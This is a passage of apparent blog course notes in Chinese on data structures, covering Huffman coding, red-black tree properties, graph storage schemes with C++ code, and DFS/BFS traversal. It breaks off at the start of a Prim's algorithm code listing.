哈夫曼编码</h3><p>数据通信用的二进制编码，思想是根据字符出现频率编码，使电文总长最短</p><p><strong>编码</strong>：根据字符出现频率构造Huffman树，然后将树中结点引向其左孩子的分支标“0”，引向其右孩子的分支标“1”；每个字符的编码即为从根到每个叶子的路径上得到的0、1序列。</p><p><strong>前缀编码</strong>：没有一个编码是另一个编码的前缀。</p><blockquote><p>例：要传输的字符集 D&#x3D;{C,A,S,T, ; }，字符出现频率 w&#x3D;{2,4,2,3,3}。</p></blockquote><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610095743704.png"></p><p>译码：从Huffman树根开始，从待译码电文中逐位取码。若编码是“0”，则向左走；若编码是“1”，则向右走，一旦到达叶子结点，则译出一个字符；再重新从根出发，直到电文结束</p><p>例如，电文是{CAS;CAT;SAT;AT}，其编码：“11010111011101000011111000011000”，电文为“1101000”，译文只能是“CAT”。</p><p>0和1究竟是表示左子树还是右子树没有明确规定，左、右孩子结点的顺序是任意的，所以构造出的哈夫曼树并不唯一，但各哈夫曼树的带权路径长度WPL相同且为最优。</p><p>此外，如果有若干权值相同的结点，则构造出的哈夫曼树更可能不同，但WPL必然相同且是最优的。</p><hr><h1 id="5-红黑树"><a href="#5-红黑树" class="headerlink" title="5 红黑树"></a>5 红黑树</h1><p>实平衡二叉树最大的作用就是查找,AVL树的查找、插入和删除在平均和最坏情况下都是O(logn)。AVL树的效率就是高在这个地方。如果在AVL树中插入或删除节点后，使得高度之差大于1。此时，AVL树的平衡状态就被破坏，它就不再是一棵二叉树；</p><p>为了让它重新维持在一个平衡状态，就需要对其进行旋转处理, 那么创建一颗平衡二叉树的成本其实不小。</p><p>有人提出了红黑树的理论，红黑树在业界应用很广泛，比如 Java 中的 TreeMap，JDK 1.8 中的 HashMap、C++ STL 中的 map 均是基于红黑树结构实现的。</p><h2 id="5-1-红黑树简介"><a href="#5-1-红黑树简介" class="headerlink" title="5.1 红黑树简介"></a>5.1 红黑树简介</h2><p>红黑树是一种自平衡的二叉查找树，是一种高效的查找树。它是由 Rudolf Bayer 于1978年发明，在当时被称为平衡二叉 B 树(symmetric binary B-trees)。后来，在1978年被 Leo J. Guibas 和 Robert Sedgewick 修改为如今的红黑树。红黑树具有良好的效率，它可在 O(logN) 时间内完成查找、增加、删除等操作。</p><h3 id="5-1-1-为什么需要红黑树"><a href="#5-1-1-为什么需要红黑树" class="headerlink" title="5.1.1 为什么需要红黑树"></a>5.1.1 为什么需要红黑树</h3><p>对于二叉搜索树，如果插入的数据是随机的，那么它就是接近平衡的二叉树，平衡的二叉树，它的操作效率（查询，插入，删除）效率较高，时间复杂度是O（logN）。</p><p>但是可能会出现一种极端的情况，那就是插入的数据是有序的（递增或者递减），那么所有的节点都会在根节点的右侧或左侧，此时，二叉搜索树就变为了一个链表，它的操作效率就降低了，时间复杂度为O(N)，所以可以认为二叉搜索树的时间复杂度介于O（logN）和O(N)之间，视情况而定。那么为了应对这种极端情况，红黑树就出现了，它是具备了某些特性的二叉搜索树，能解决非平衡树问题，红黑树是一种接近平衡的二叉树（说它是接近平衡因为它并没有像AVL树的平衡因子的概念，它只是靠着满足红黑节点的5条性质来维持一种接近平衡的结构，进而提升整体的性能，并没有严格的卡定某个平衡因子来维持绝对平衡）。</p><h3 id="5-1-2-红黑树的特性"><a href="#5-1-2-红黑树的特性" class="headerlink" title="5.1.2 红黑树的特性"></a>5.1.2 红黑树的特性</h3><p>首先，红黑树是一个二叉搜索树，它在每个节点增加了一个存储位记录节点的颜色，可以是RED，也可以是BLACK；</p><p>通过任意一条从根到叶子简单路径上颜色的约束，红黑树保证最长路径不超过最短路径的二倍，因而近似平衡（最短路径就是全黑节点，最长路径就是一个红节点一个黑节点，当从根节点到叶子节点的路径上黑色节点相同时，最长路径刚好是最短路径的两倍）。它同时满足以下特性：</p><ol><li><p>节点是红色或黑色</p></li><li><p>根是黑色</p></li><li><p>叶子节点（外部节点，空节点）都是黑色，这里的叶子节点指的是最底层的空节点（外部节点），下图中的那些null节点才是叶子节点，null节点的父节点在红黑树里不将其看作叶子节点</p></li><li><p>红色节点的子节点都是黑色</p><ul><li>红色节点的父节点都是黑色</li><li>从根节点到叶子节点的所有路径上不能有 2 个连续的红色节点</li></ul></li><li><p>从任一节点到叶子节点的所有路径都包含相同数目的黑色节点</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构第6章：图</title>
      <link href="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%9B%BE/"/>
      <url>/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="1-图的存储"><a href="#1-图的存储" class="headerlink" title="1 图的存储"></a>1 图的存储</h1><p>图的存储结构至少要保存两类信息：</p><ol><li>顶点的数据</li><li>顶点间的关系</li></ol><p>如何表示顶点间的关系？</p><h2 id="1-1-邻接矩阵"><a href="#1-1-邻接矩阵" class="headerlink" title="1.1 邻接矩阵"></a>1.1 邻接矩阵</h2><p>图的邻接矩阵(Adjacency Matrix) 存储方式是用两个数组来表示图。一个一维数组存储图中顶点信息，一个二维数组(称为邻接矩阵)存储图中的边或弧的信息。</p><p>设图 G 有 n 个顶点，则邻接矩阵 A 是一个$n ∗ n$的方阵，定义为:</p><p><img src="https://img-blog.csdnimg.cn/20210301095908432.png#pic_center"></p><p>下图是一个无向图和它的邻接矩阵：</p><p><img src="https://img-blog.csdnimg.cn/202103011006555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><p>可以看出：</p><ol><li>无向图的邻接矩阵一定是一个对称矩阵(即从矩阵的左上角到右下角的主对角线为轴，右上角的元与左下角相对应的元全都是相等的)。 因此，在实际存储邻接矩阵时只需存储上(或下)三角矩阵的元素。</li><li>对于无向图，邻接矩阵的第i行(或第i列)非零元素(或非∞元素)的个数正好是第i个顶点的度。</li><li>有向图中：<ul><li>顶点 $ V_{i} $ 的出度是A中第 i 行元素之和</li><li>顶点 $ V_{i} $ 的入度是A中第 i 列元素之和</li></ul></li></ol><p><strong>邻接矩阵存储适用于稠密图。</strong></p><h2 id="1-2-邻接表"><a href="#1-2-邻接表" class="headerlink" title="1.2 邻接表"></a>1.2 邻接表</h2><p>当一个图为稀疏图时（边数相对顶点较少），使用邻接矩阵法显然要浪费大量的存储空间，如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20210301113238489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><p>而图的邻接表法结合了顺序存储和链式存储方法，大大减少了这种不必要的浪费。</p><p>邻接表类似于树的孩子表示法，如果能把图中任一个顶点的所有邻接点都表示出来，也就可以表示图。</p><p>实现：为图中每个顶点建立一个单链表，第i个单链表中的结点表示依附于顶点Vi的边（有向图中指以Vi为尾的弧）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 图的邻接表存储</span></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">e[idx] = b, ne[idx] = h[a], h[a] = idx ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无向图的邻接表的实例如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20210301165232511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><h3 id="1-2-1-邻接表表示的特点"><a href="#1-2-1-邻接表表示的特点" class="headerlink" title="1.2.1 邻接表表示的特点"></a>1.2.1 邻接表表示的特点</h3><ol><li>无向图中顶点Vi的度为第i个单链表中的结点数</li><li>有向图中<ul><li>顶点Vi的出度为第i个单链表中的结点个数</li><li>顶点Vi的入度为整个单链表中邻接点域值是i的结点个数</li></ul></li><li>逆邻接表：有向图中对每个结点建立以Vi为头的弧的单链表</li></ol><h2 id="1-3-十字链表"><a href="#1-3-十字链表" class="headerlink" title="1.3 十字链表"></a>1.3 十字链表</h2><p>十字链表是<strong>有向图</strong>的一种链式存储结构。</p><p>对于有向图来说，邻接表是有缺陷的。关心了出度问题，想了解入度就必须要遍历整个图才能知道，反之，逆邻接表解决了入度却不了解出度的情况。有没有可能把邻接表与逆邻接表结合起来呢?答案是肯定的，就是把它们整合在一起。这就是我们现在要介绍的有向图的一种存储方法：十字链表(Orthogonal List)。</p><p>重新定义顶点表结点结构如下表所示。</p><p><img src="https://img-blog.csdnimg.cn/20210301175445875.png#pic_center"></p><p>其中 $ firstin $ 表示入边表头指针，指向该顶点的入边表中第一个结点，$ firstout $ 表示出边表头指针，指向该顶点的出边表中的第一个结点。</p><p>重新定义的边表结点结构如下表所示。</p><p><img src="https://img-blog.csdnimg.cn/20210301175546226.png#pic_center"></p><p>其中$tailvex$是指弧起点在顶点表的下标，$headvex$ 是指弧终点在顶点表中的下标， $ headlink $ 是指入边表指针域，指向终点相同的下一条边，$ taillink $ 是指边表指针域，指向起点相同的下一条边。如果是网，还可以再增加一个 $ weight $ 域来存储权值。</p><p><strong>举例如下：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210301180237656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><p>十字链表的好处就是因为把邻接表和逆邻接表整合在了一起，这样既容易找到以$ V_{i} $为尾的弧，也容易找到以$ V_{i} $为头的弧，因而容易求得顶点的出度和入度。</p><p>而且它除了结构复杂一点外，其实创建图算法的时间复杂度是和邻接表相同的，因此，在有向图的应用中，十字链表是非常好的数据结构模型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxNum = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">arcNode</span> &#123;    <span class="comment">//弧结点类型</span></span><br><span class="line"><span class="type">int</span> tail;<span class="comment">//弧尾下标</span></span><br><span class="line"><span class="type">int</span> head;<span class="comment">//弧头下标</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">arcNode</span>*hlink;<span class="comment">//指针，指向同弧头的弧</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">arcNode</span>*tlink;<span class="comment">//指针，指向同弧尾的弧</span></span><br><span class="line">&#125;arcNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vexNode</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> data;<span class="comment">//指点数据</span></span><br><span class="line">arcNode *firstIn;<span class="comment">//指针，指向第一个入弧</span></span><br><span class="line">arcNode *firstout;<span class="comment">//指针，指向第一个出弧</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">vexNode vex[maxNum];</span><br><span class="line"><span class="type">int</span> vexnum, edgenum;<span class="comment">//顶点数量，边数量</span></span><br><span class="line">&#125;OLGraph;</span><br><span class="line"></span><br><span class="line">OLGraph g;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateVex</span><span class="params">(<span class="type">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; g.vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (g.vex[i].data == c)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertedge</span><span class="params">(<span class="type">char</span> a, <span class="type">char</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ai = <span class="built_in">LocateVex</span>(a);</span><br><span class="line"><span class="type">int</span> bi = <span class="built_in">LocateVex</span>(b);</span><br><span class="line">arcNode* an = <span class="keyword">new</span> arcNode;  <span class="comment">// 生成一条新弧</span></span><br><span class="line">an-&gt;tlink = g.vex[ai].firstout;</span><br><span class="line">an-&gt;head = bi;<span class="comment">//由ai-&gt;bi</span></span><br><span class="line">an-&gt;tail = ai;</span><br><span class="line">g.vex[ai].firstout = an;<span class="comment">//顶点第一个出弧更新，头插入</span></span><br><span class="line">an-&gt;hlink = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (g.vex[bi].firstIn == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">g.vex[bi].firstIn = an;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">arcNode* curArc = g.vex[bi].firstIn;<span class="comment">//找到最后一个入弧,尾插入</span></span><br><span class="line"><span class="keyword">while</span> (curArc-&gt;hlink != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">curArc = curArc-&gt;hlink;</span><br><span class="line">&#125;</span><br><span class="line">curArc-&gt;hlink = an;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateOLGraph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入顶点数量和边数：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; g.vexnum &gt;&gt; g.edgenum;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入对应的顶点:&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; g.vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; g.vex[i].data;</span><br><span class="line">g.vex[i].firstIn = <span class="literal">NULL</span>; </span><br><span class="line">g.vex[i].firstout = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入要插入的边&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="type">int</span> m = g.edgenum;</span><br><span class="line"><span class="keyword">while</span> (m &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a, b;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="built_in">insertedge</span>(a, b);</span><br><span class="line">m--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetOLVexDu</span><span class="params">()</span> </span>&#123;<span class="comment">//获得十字链表中某一个点的入度和出度</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; g.vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">vexNode n = g.vex[i];</span><br><span class="line">cout &lt;&lt; n.data &lt;&lt; <span class="string">&quot;的出度有&quot;</span> &lt;&lt; <span class="string">&quot; : &quot;</span>;</span><br><span class="line">arcNode* outArc = n.firstout;</span><br><span class="line"><span class="keyword">while</span> (outArc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; outArc-&gt;head &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">outArc = outArc-&gt;tlink;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; n.data &lt;&lt; <span class="string">&quot;的入度有&quot;</span> &lt;&lt; <span class="string">&quot; : &quot;</span>;</span><br><span class="line">arcNode* inArc = n.firstIn;</span><br><span class="line"><span class="keyword">while</span> (inArc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; inArc-&gt;tail &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">inArc = inArc-&gt;hlink;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">CreateOLGraph</span>();</span><br><span class="line"><span class="built_in">GetOLVexDu</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-4-邻接多重表"><a href="#1-4-邻接多重表" class="headerlink" title="1.4 邻接多重表"></a>1.4 邻接多重表</h2><p>邻接多重表是<strong>无向图</strong>的另一种链式存储结构。</p><p>在邻接表中，容易求得顶点和边的各种信息，但在邻接表中求两个顶点之间是否存在边而对边执行删除等操作时，需要分别在两个顶点的边表中遍历，效率较低。</p><p>比如下图中，若要删除左图的（$v_0$, $v_2$）这条边，需要对邻接表结构中右边表的阴影两个结点进行删除操作，显然这是比较烦琐的。</p><p><img src="https://img-blog.csdnimg.cn/20210301182203109.png#pic_center"></p><p>重新定义的边表结点结构如下表所示。</p><p><img src="https://img-blog.csdnimg.cn/20210301183315496.png#pic_center"></p><p>其中 $ivex$ 和 $jvex$ 是与某条边依附的两个顶点在顶点表中下标。$ilink$ 指向依附顶点 $ivex$ 的下一条边，$jlink$ 指向依附顶点 $jvex$ 的下一条边。这就是邻接多重表结构。</p><p>每个顶点也用一一个结点表示，它由如下所示的两个域组成。</p><p><img src="https://img-blog.csdnimg.cn/20210301183423578.png#pic_center"></p><p>其中，$data$ 域存储该顶点的相关信息，$firstedge$ 域指示第一条依附于该顶点的边。</p><p><strong>举例如下：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210301185220315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center"></p><hr><h1 id="2-图的遍历"><a href="#2-图的遍历" class="headerlink" title="2 图的遍历"></a>2 图的遍历</h1><p>图的遍历（Traversing Graph）：从图中某一个顶点出发，访问图中的其余顶点，且使每个顶点仅被访问一次。</p><p>主要有深度优先搜索和广度优先搜索，它们对无向图和有向图都适用。</p><ul><li>深度优先搜索类似于树的先根遍历</li><li>广度优先搜索类似于树的层次遍历</li></ul><h2 id="2-1-DFS"><a href="#2-1-DFS" class="headerlink" title="2.1 DFS"></a>2.1 DFS</h2><p>从图的某一顶点$V_{0}$出发，访问此顶点；然后依次从$V_{0}$的未被访问的邻接点出发，深度优先遍历图，直至图中所有和$V_{0}$相通的顶点都被访问到；</p><p>若此时图中尚有顶点未被访问，则另选图中一个未被访问的顶点作起点，重复上述过程，直至图中所有顶点都被访问为止。</p><h3 id="2-1-1-DFS代码模板"><a href="#2-1-1-DFS代码模板" class="headerlink" title="2.1.1 DFS代码模板"></a>2.1.1 DFS代码模板</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    st[u] = <span class="literal">true</span>;  <span class="comment">// st[u] 表示点u已经被遍历过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!st[j]) <span class="built_in">dfs</span>(j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210302110631863.png#pic_center"></p><ul><li>对于同一个图，基于邻接矩阵的遍历得到的DFS序列和BFS序列是唯一的</li><li>基于邻接表遍历所得到的DFS序列和BFS序列是不唯一的</li></ul><h3 id="2-1-2-性能分析"><a href="#2-1-2-性能分析" class="headerlink" title="2.1.2 性能分析"></a>2.1.2 性能分析</h3><ul><li><strong>空间复杂度</strong>：递归算法，需要使用递归栈，空间复杂度为$O(V)$，$V$为顶点数</li><li><strong>时间复杂度</strong>：遍历过程实际上是查找每个点的临界点的过程<ul><li>邻接矩阵：查找每个顶点的邻接点需要时间为$O(|V|)$，总时间复杂度为$O(|V^2|)$</li><li>邻接表：查找每个顶点的邻接点需要时间为$O(|E|)$，总时间复杂度为$O(|V|+|E|)$</li></ul></li></ul><h2 id="2-2-BFS"><a href="#2-2-BFS" class="headerlink" title="2.2 BFS"></a>2.2 BFS</h2><p>从图的某一顶点$V_{0}$出发，访问此顶点后，依次访问$V_{0}$的各个未曾访问过的邻接点；然后分别从这些邻接点出发，广度优先遍历图，直至图中所有已被访问的顶点的邻接点都被访问到；</p><p>若此时图中尚有顶点未被访问，则另选图中一个未被访问的顶点作起点，重复上述过程，直至图中所有顶点都被访问为止。</p><h3 id="2-2-1-BFS代码模板"><a href="#2-2-1-BFS代码模板" class="headerlink" title="2.2.1 BFS代码模板"></a>2.2.1 BFS代码模板</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">st[<span class="number">1</span>] = <span class="literal">true</span>;  <span class="comment">// 表示1号点已经被遍历过</span></span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = e[i];</span><br><span class="line"><span class="keyword">if</span> (!st[j])</span><br><span class="line">&#123;</span><br><span class="line">st[j] = <span class="literal">true</span>;  <span class="comment">// 表示点j已经被遍历过</span></span><br><span class="line">q.<span class="built_in">push</span>(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hackr.io/blog/media/architecture-of-bfs.png"></p><h3 id="2-2-2-性能分析"><a href="#2-2-2-性能分析" class="headerlink" title="2.2.2 性能分析"></a>2.2.2 性能分析</h3><ul><li><strong>空间复杂度</strong>：无论使用什么存储方式，BFS都需要借助一个辅助队列$Q$，因此最坏情况下，空间复杂度为$O(|V|)$</li><li><strong>时间复杂度</strong>：分析同DFS<ul><li>邻接矩阵：$O(|V|^2)$</li><li>邻接表：$O(|V|+|E|)$</li></ul></li></ul><hr><h1 id="3-最小生成树"><a href="#3-最小生成树" class="headerlink" title="3 最小生成树"></a>3 最小生成树</h1><p><strong>生成树</strong>：所有顶点均由边连接在一起，但不存在回路的图。</p><p>一个图可以有许多棵不同的生成树，所有生成树具有以下共同特点：</p><ol><li>生成树的顶点个数与图的顶点个数相同</li><li>生成树是图的极小连通子图</li><li>一个有n个顶点的连通图的生成树有n-1条边</li><li>生成树中任意两个顶点间的路径是唯一的</li><li>在生成树中再加一条边必然形成回路</li></ol><p>含n个顶点n-1条边的图不一定是生成树。</p><h2 id="3-1-普利姆（Prim）算法"><a href="#3-1-普利姆（Prim）算法" class="headerlink" title="3.1 普利姆（Prim）算法"></a>3.1 普利姆（Prim）算法</h2><h3 id="3-1-1-算法思想"><a href="#3-1-1-算法思想" class="headerlink" title="3.1.1 算法思想"></a>3.1.1 算法思想</h3><ul><li>初始令$U&#x3D;{u_{0}}，(u_{0}∈V), TE&#x3D;\phi$；</li><li>在所有$u∈U，v∈V-U$的边$(u,v)∈E$中，找一条代价最小的边($u_{0}$，$v_{0}$)；</li><li>将($u_{0}$，$v_{0}$)并入集合TE，同时$v_{0}$并入U；</li><li>重复上述操作直至$U&#x3D;V$为止，则$T&#x3D;(V,{TE})$为N的最小生成树；</li></ul><h3 id="3-1-2-算法过程"><a href="#3-1-2-算法过程" class="headerlink" title="3.1.2 算法过程"></a>3.1.2 算法过程</h3><p><img src="https://img-blog.csdnimg.cn/3e8389add71f4f4f8ff01d977bda755d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Njg1NTg0,size_16,color_FFFFFF,t_70"></p><h3 id="3-1-3-代码实现"><a href="#3-1-3-代码实现" class="headerlink" title="3.1.3 代码实现"></a>3.1.3 代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 